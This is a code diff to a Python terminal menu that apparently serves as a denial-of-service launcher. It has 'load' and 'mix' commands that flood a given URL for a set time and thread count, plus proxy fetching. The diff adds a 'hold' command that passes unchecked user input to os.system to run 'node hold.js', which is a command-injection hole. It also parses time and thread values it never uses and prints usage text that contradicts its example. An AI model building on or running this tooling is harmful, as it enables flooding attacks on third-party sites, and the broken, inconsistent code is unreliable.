@@ -137,7 +137,7 @@ def tools():
                 \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mget-proxy             \x1b[38;2;0;212;14m║  
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mhold               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
@@ -276,15 +276,15 @@ def main():
                 print('Usage: load <url> <time> ')
                 print('Example: load http://example-cloud.com 60')
 
-        elif "empty" in cnc:
+        elif "hold" in cnc:
             try:
-                url = cnc.split()[1]
+                command = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'./https-mix {url} {time} {thread}')
+                os.system(f'node hold.js {command}')
             except IndexError:
-                print('Usage: mix <url> <time> <thread>')
-                print('Example: mix http://example.org 60 900')
+                print('Usage: hold https http://google.com 60')
+                print('Example: hold https http://gggg.com')
 
         elif "get-proxy" in cnc:
             try:
